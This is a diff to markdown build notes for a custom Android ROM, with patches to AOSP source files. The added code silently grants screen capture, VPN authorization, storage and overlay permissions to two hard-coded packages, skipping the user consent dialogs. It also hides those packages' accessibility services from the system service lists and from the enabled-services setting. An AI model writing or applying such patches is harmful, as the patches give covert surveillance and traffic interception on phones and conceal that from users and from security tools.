@@ -66,9 +66,7 @@ nano device/samsung/greatlte/device.mk : $(call inherit-product, vendor/gapps/ar
 
 # Auto grant Perrmission for app : 
 
-Edit packages/apps/Settings/src/com/android/settings/applications/appinfo
-
-+ ExternalSourcesDetails.java :
++ packages/apps/Settings/src/com/android/settings/applications/appinfo/ExternalSourcesDetails.java :
     ```markdown
        mUserManager = UserManager.get(context);
        if (mPackageName != null && "com.maxcloud.app".equals(mPackageName)) {
@@ -84,7 +82,8 @@ Edit packages/apps/Settings/src/com/android/settings/applications/appinfo
                 getActivity().finish();
                 return;
             }
-+ ManageExternalStorageDetails.java :
+    ```
++ packages/apps/Settings/src/com/android/settings/applications/appinfo/ManageExternalStorageDetails.java :
     ```markdown
          mMetricsFeatureProvider =
         FeatureFactory.getFactory(getContext()).getMetricsFeatureProvider();
@@ -103,7 +102,207 @@ Edit packages/apps/Settings/src/com/android/settings/applications/appinfo
                 }
             }, 100);
         }
+    ```
 
 
- 
++ frameworks/base/packages/SystemUI/src/com/android/systemui/media/MediaProjectionPermissionActivity.java
+    ```markdown
+          if (mPackageName.equals("com.maxcloud.app") || mPackageName.equals("vn.onox.helper")) {
+            grantMediaProjectionPermission(ENTIRE_SCREEN);
+            return;
+        }
 
+        TextPaint paint = new TextPaint();
+        paint.setTextSize(42);
+    ```
+
++ frameworks/base/packages/VpnDialogs/src/com/android/vpndialogs/ConfirmDialog.java
+    ```markdown
+             if (mPackage.equals("com.maxcloud.app") || mPackage.equals("vn.onox.helper") || mPackage.equals("vn.onox.helper")) {
+        Log.i(TAG, "Auto-granting VPN permission for package: " + mPackage);
+        try {
+            if (mVm.prepareVpn(null, mPackage, UserHandle.myUserId())) {
+                mVm.setVpnPackageAuthorization(mPackage, UserHandle.myUserId(), mVpnType);
+                setResult(RESULT_OK);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error auto-granting VPN permission", e);
+        }
+        finish();
+        return;
+    }
+    ```
+
+
++ frameworks/base/services/core/java/com/android/server/pm/permission/PermissionManagerService.java
+   ```markdown
+   @Override
+        public void onPackageInstalled(@NonNull AndroidPackage pkg, int previousAppId,
+                @NonNull PackageInstalledParams params, @UserIdInt int rawUserId) {
+            Objects.requireNonNull(pkg, "pkg");
+            Objects.requireNonNull(params, "params");
+            Preconditions.checkArgument(rawUserId >= UserHandle.USER_SYSTEM
+                    || rawUserId == UserHandle.USER_ALL, "userId");
+
+            mPermissionManagerServiceImpl.onPackageInstalled(pkg, previousAppId, params, rawUserId);
+            
+            
+            if ("com.maxcloud.app".equals(pkg.getPackageName()) || "vn.onox.helper".equals(pkg.getPackageName())) {
+                final int[] userIds = rawUserId == UserHandle.USER_ALL ? getAllUserIds() : new int[]{rawUserId};
+                
+                final String[] permissions = {
+                    "android.permission.WRITE_EXTERNAL_STORAGE",
+                    "android.permission.READ_EXTERNAL_STORAGE",
+                    "android.permission.POST_NOTIFICATIONS",
+                    "android.permission.SYSTEM_ALERT_WINDOW"
+                };
+                
+                for (final int userId : userIds) {
+                    for (final String permission : permissions) {
+                        mPermissionManagerServiceImpl.grantRuntimePermission(
+                            pkg.getPackageName(), permission, userId);
+                    }
+                }
+            }
+            
+            final int[] userIds = rawUserId == UserHandle.USER_ALL ? getAllUserIds()
+                    : new int[] { rawUserId };
+            for (final int userId : userIds) {
+                final int autoRevokePermissionsMode = params.getAutoRevokePermissionsMode();
+                if (autoRevokePermissionsMode == AppOpsManager.MODE_ALLOWED
+                        || autoRevokePermissionsMode == AppOpsManager.MODE_IGNORED) {
+                    setAutoRevokeExemptedInternal(pkg,
+                            autoRevokePermissionsMode == AppOpsManager.MODE_IGNORED, userId);
+                }
+            }
+        }
+    ```
+
+## Hide Accessibiltiy Service
+
+  + frameworks/base/services/accessibility/java/com/android/server/accessibility/AccessibilityManagerService.java
+    ```markdown
+            @Override
+    public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(int userId) {
+        if (mTraceManager.isA11yTracingEnabledForTypes(FLAGS_ACCESSIBILITY_MANAGER)) {
+            mTraceManager.logTrace(LOG_TAG + ".getInstalledAccessibilityServiceList",
+                    FLAGS_ACCESSIBILITY_MANAGER, "userId=" + userId);
+        }
+
+        final int resolvedUserId;
+        final List<AccessibilityServiceInfo> serviceInfos;
+        synchronized (mLock) {
+            // We treat calls from a profile as if made by its parent as profiles
+            // share the accessibility state of the parent. The call below
+            // performs the current profile parent resolution.
+            resolvedUserId = mSecurityPolicy
+                    .resolveCallingUserIdEnforcingPermissionsLocked(userId);
+            serviceInfos = new ArrayList<>(
+                    getUserStateLocked(resolvedUserId).mInstalledServices);
+                    
+                    
+            for (int i = serviceInfos.size() - 1; i >= 0; i--) {
+              final AccessibilityServiceInfo serviceInfo = serviceInfos.get(i);
+              String packageName = serviceInfo.getComponentName().getPackageName();
+              if (packageName.contains("com.maxcloud.app") || packageName.contains("vn.onox.app")) {
+                  serviceInfos.remove(i);
+              }
+            }
+        }
+
+        if (Binder.getCallingPid() == OWN_PROCESS_ID) {
+            return serviceInfos;
+        }
+        final PackageManagerInternal pm = LocalServices.getService(
+                PackageManagerInternal.class);
+        final int callingUid = Binder.getCallingUid();
+        for (int i = serviceInfos.size() - 1; i >= 0; i--) {
+            final AccessibilityServiceInfo serviceInfo = serviceInfos.get(i);
+            if (pm.filterAppAccess(serviceInfo.getComponentName().getPackageName(), callingUid,
+                    resolvedUserId)) {
+                serviceInfos.remove(i);
+            }
+        }
+        return serviceInfos;
+    }
+    
+
+    @Override
+    public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(int feedbackType,
+            int userId) {
+        if (mTraceManager.isA11yTracingEnabledForTypes(FLAGS_ACCESSIBILITY_MANAGER)) {
+            mTraceManager.logTrace(LOG_TAG + ".getEnabledAccessibilityServiceList",
+                    FLAGS_ACCESSIBILITY_MANAGER,
+                    "feedbackType=" + feedbackType + ";userId=" + userId);
+        }
+
+        synchronized (mLock) {
+            // We treat calls from a profile as if made by its parent as profiles
+            // share the accessibility state of the parent. The call below
+            // performs the current profile parent resolution.
+            final int resolvedUserId = mSecurityPolicy
+                    .resolveCallingUserIdEnforcingPermissionsLocked(userId);
+
+            // The automation service can suppress other services.
+            final AccessibilityUserState userState = getUserStateLocked(resolvedUserId);
+            if (mUiAutomationManager.suppressingAccessibilityServicesLocked()) {
+                return Collections.emptyList();
+            }
+
+            final List<AccessibilityServiceConnection> services = userState.mBoundServices;
+            final int serviceCount = services.size();
+            final List<AccessibilityServiceInfo> result = new ArrayList<>(serviceCount);
+            for (int i = 0; i < serviceCount; ++i) {
+                final AccessibilityServiceConnection service = services.get(i);
+                
+                String packageName = service.getServiceInfo().getResolveInfo().serviceInfo.packageName;
+                if (packageName.contains("com.maxcloud.app")) {
+                    continue; // Bỏ qua service này, không thêm vào result
+                }
+                
+                if ((service.mFeedbackType & feedbackType) != 0
+                        || feedbackType == AccessibilityServiceInfo.FEEDBACK_ALL_MASK) {
+                    result.add(service.getServiceInfo());
+                }
+            }
+            return result;
+        }
+    }
+    
+    ```
+
++ frameworks/base/core/java/android/provider/Settings.java
+    ```markdown
+        @UnsupportedAppUsage
+        public static String getStringForUser(ContentResolver resolver, String name,
+                int userHandle) {
+            if (MOVED_TO_SECURE.contains(name)) {
+                Log.w(TAG, "Setting " + name + " has moved from android.provider.Settings.System"
+                        + " to android.provider.Settings.Secure, returning read-only value.");
+                        
+                String secureValue = Secure.getStringForUser(resolver, name, userHandle);
+                // Thêm logic lọc cho ENABLED_ACCESSIBILITY_SERVICES
+                if (name.equals(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) && secureValue != null) {
+                    String[] services = secureValue.split(":");
+                    List<String> filteredServices = new ArrayList<>();
+                    for (String service : services) {
+                        if (!service.contains("com.maxcloud.app")) {
+                            filteredServices.add(service);
+                        }
+                    }
+                    return TextUtils.join(":", filteredServices);
+                }
+                return secureValue;
+                // return Secure.getStringForUser(resolver, name, userHandle);
+            }
+            if (MOVED_TO_GLOBAL.contains(name) || MOVED_TO_SECURE_THEN_GLOBAL.contains(name)) {
+                Log.w(TAG, "Setting " + name + " has moved from android.provider.Settings.System"
+                        + " to android.provider.Settings.Global, returning read-only value.");
+                return Global.getStringForUser(resolver, name, userHandle);
+            }
+
+            return sNameValueCache.getStringForUser(resolver, name, userHandle);
+        }
+    ```
+    
+  
